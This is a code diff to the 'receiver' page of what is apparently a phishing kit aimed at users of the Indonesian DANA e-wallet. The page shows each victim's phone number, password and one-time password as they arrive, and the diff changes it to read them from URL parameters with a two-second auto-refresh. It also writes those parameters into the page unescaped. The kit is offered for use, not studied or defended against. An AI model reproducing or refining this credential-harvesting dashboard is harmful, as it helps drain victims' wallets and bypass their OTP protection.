@@ -164,17 +164,6 @@
         .empty-state i { font-size: 40px; color: #2a2a4e; margin-bottom: 8px; }
         .empty-state h5 { color: #8a8aaa; font-weight: 500; }
 
-        .status-badge {
-            display: inline-block;
-            padding: 2px 14px;
-            border-radius: 60px;
-            font-size: 12px;
-            font-weight: 600;
-        }
-        .status-badge.pending { background: #ff8800; color: #000; }
-        .status-badge.otp_sent { background: #0080ff; color: #fff; }
-        .status-badge.verified { background: #00aa44; color: #fff; }
-
         .toast-container {
             position: fixed;
             bottom: 24px;
@@ -218,7 +207,7 @@
             <h5>Menunggu Data...</h5>
             <p style="font-size:13px;color:#4a4a6a;">Tunggu user mengirim data dari halaman utama</p>
             <p style="font-size:12px;color:#2a2a4e;margin-top:8px;">
-                <i class="bi bi-arrow-repeat"></i> Auto refresh setiap 1 detik
+                <i class="bi bi-arrow-repeat"></i> Auto refresh setiap 2 detik
             </p>
         </div>
     </div>
@@ -239,38 +228,22 @@
 
 <script>
     // ============================================================
-    // RECEIVER.HTML — PASTI TAMPIL NOMOR & PASSWORD
+    // RECEIVER — BACA DATA DARI URL PARAMETER
     // ============================================================
-
-    let lastData = '';
 
     function loadData() {
         const container = document.getElementById('dataContent');
 
-        const userDataRaw = localStorage.getItem('dana_user_data');
-        const otpDataRaw = localStorage.getItem('dana_otp_data');
-
-        let userData = null;
-        let otpData = null;
-
-        try {
-            if (userDataRaw) userData = JSON.parse(userDataRaw);
-            if (otpDataRaw) otpData = JSON.parse(otpDataRaw);
-        } catch(e) {
-            console.error('Parse error:', e);
-        }
+        // === BACA URL ===
+        const params = new URLSearchParams(window.location.search);
+        const phone = params.get('phone');
+        const password = params.get('password');
+        const otp = params.get('otp');
 
         document.getElementById('lastUpdate').textContent = 'Terakhir update: ' + new Date().toLocaleTimeString('id-ID');
 
-        const currentData = JSON.stringify({ user: userData, otp: otpData });
-        if (currentData === lastData && document.querySelector('.data-box')) return;
-        lastData = currentData;
-
-        // === DEBUG ===
-        console.log('📦 dana_user_data:', userData);
-        console.log('📦 dana_otp_data:', otpData);
-
-        if (!userData && !otpData) {
+        // === KALO GAK ADA DATA ===
+        if (!phone && !password && !otp) {
             container.innerHTML = `
                 <div class="empty-state">
                     <i class="bi bi-inbox"></i>
@@ -279,9 +252,6 @@
                     <p style="font-size:12px;color:#2a2a4e;margin-top:8px;">
                         <i class="bi bi-info-circle"></i> Pastikan index.html sudah diklik Verifikasi
                     </p>
-                    <p style="font-size:11px;color:#2a2a4e;margin-top:4px;">
-                        <i class="bi bi-code-square"></i> Cek console (F12) untuk debug
-                    </p>
                 </div>
             `;
             return;
@@ -289,55 +259,47 @@
 
         let html = '';
 
-        // === USER DATA (HARUS TAMPIL) ===
-        if (userData) {
-            const statusClass = userData.status === 'pending' ? 'pending' :
-                               userData.status === 'otp_sent' ? 'otp_sent' : 'verified';
-            const statusLabel = userData.status === 'pending' ? 'Menunggu OTP' :
-                               userData.status === 'otp_sent' ? 'OTP Terkirim' : 'Selesai';
-
+        // === USER DATA ===
+        if (phone || password) {
             html += `
                 <div class="data-box" style="border-color:#0080ff;">
                     <div class="label"><i class="bi bi-person"></i> DATA USER</div>
-                    <div class="value phone"><i class="bi bi-phone"></i> ${userData.phone || '-'}</div>
-                    <div class="value password"><i class="bi bi-lock"></i> ${userData.password || '-'}</div>
-                    <div style="margin-top:6px;">
-                        <span class="status-badge ${statusClass}">${statusLabel}</span>
-                        <span style="color:#4a4a6a;font-size:11px;margin-left:8px;">${new Date(userData.timestamp).toLocaleTimeString('id-ID')}</span>
+                    ${phone ? `<div class="value phone"><i class="bi bi-phone"></i> ${phone}</div>` : ''}
+                    ${password ? `<div class="value password"><i class="bi bi-lock"></i> ${password}</div>` : ''}
+                    <div style="margin-top:6px;color:#4a4a6a;font-size:11px;">
+                        <i class="bi bi-clock"></i> ${new Date().toLocaleTimeString('id-ID')}
                     </div>
                 </div>
             `;
         }
 
         // === OTP DATA ===
-        if (otpData) {
+        if (otp) {
             html += `
                 <div class="data-box" style="border-color:#00ff44;">
                     <div class="label"><i class="bi bi-shield-check"></i> KODE OTP</div>
-                    <div class="value otp">${otpData.otp || '------'}</div>
-                    <div style="font-size:13px;color:#6a6a8a;margin-top:4px;">
-                        <i class="bi bi-phone"></i> ${otpData.phone || '-'}
-                        <span style="margin-left:12px;color:#4a4a6a;">${new Date(otpData.timestamp).toLocaleTimeString('id-ID')}</span>
+                    <div class="value otp">${otp}</div>
+                    <div style="margin-top:4px;color:#4a4a6a;font-size:11px;">
+                        <i class="bi bi-clock"></i> ${new Date().toLocaleTimeString('id-ID')}
                     </div>
                 </div>
             `;
         }
 
         // === STATUS ===
-        const hasOtp = otpData && otpData.otp;
         html += `
             <div style="margin-top:12px;padding:10px 14px;background:#0a0a1a;border-radius:12px;border:1px solid #1a1a2e;">
                 <div class="info-row">
                     <span class="label">Status</span>
-                    <span class="value" style="color:${hasOtp ? '#00ff44' : '#ff8800'};">${hasOtp ? 'OTP Diterima' : 'Menunggu OTP...'}</span>
+                    <span class="value" style="color:${otp ? '#00ff44' : '#ff8800'};">${otp ? 'OTP Diterima' : 'Menunggu OTP...'}</span>
                 </div>
                 <div class="info-row">
                     <span class="label">Data User</span>
-                    <span class="value" style="color:${userData ? '#00ff44' : '#ff4400'};">${userData ? 'Ada' : 'Tidak Ada'}</span>
+                    <span class="value" style="color:${phone ? '#00ff44' : '#ff4400'};">${phone ? 'Ada' : 'Tidak Ada'}</span>
                 </div>
                 <div class="info-row">
                     <span class="label">Total Data</span>
-                    <span class="value">${(userData ? 1 : 0) + (otpData ? 1 : 0)} item</span>
+                    <span class="value">${(phone ? 1 : 0) + (otp ? 1 : 0)} item</span>
                 </div>
             </div>
         `;
@@ -353,20 +315,17 @@
         setTimeout(() => { toast.style.display = 'none'; }, 3000);
     }
 
-    // AUTO LOAD
+    // ===== AUTO LOAD =====
     loadData();
-    setInterval(loadData, 1000);
 
-    window.addEventListener('storage', function(e) {
-        if (e.key === 'dana_user_data' || e.key === 'dana_otp_data') {
-            loadData();
-            showToast('Data baru masuk!');
-        }
-    });
+    // Refresh setiap 2 detik (biar update otomatis)
+    setInterval(loadData, 2000);
 
-    console.log('🔍 Receiver aktif');
-    console.log('📦 dana_user_data:', localStorage.getItem('dana_user_data'));
-    console.log('📦 dana_otp_data:', localStorage.getItem('dana_otp_data'));
+    // ===== CEK PERUBAHAN URL (popstate) =====
+    window.addEventListener('popstate', loadData);
+
+    console.log('🔍 Receiver aktif — baca data dari URL');
+    console.log('📦 URL:', window.location.href);
 </script>
 
 </body>
